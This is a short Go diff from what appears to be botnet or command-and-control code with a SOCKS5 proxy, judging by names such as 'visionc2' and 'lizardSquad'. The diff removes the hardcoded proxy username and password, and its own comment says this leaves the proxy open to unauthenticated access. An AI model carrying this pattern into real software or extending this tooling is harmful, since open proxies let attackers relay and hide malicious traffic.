@@ -48,8 +48,8 @@ var lizardSquad = []string{
 // socksUsername and socksPassword gate the SOCKS5 proxy.
 // Leave both empty to allow unauthenticated access.
 // Protected by sockCredsMutex for concurrent read/write safety.
-var socksUsername = "visionc2"
-var socksPassword = "synackrst666"
+var socksUsername = ""
+var socksPassword = ""
 
 // lazarusMax caps concurrent SOCKS5 connections.
 var lazarusMax int32 = 100
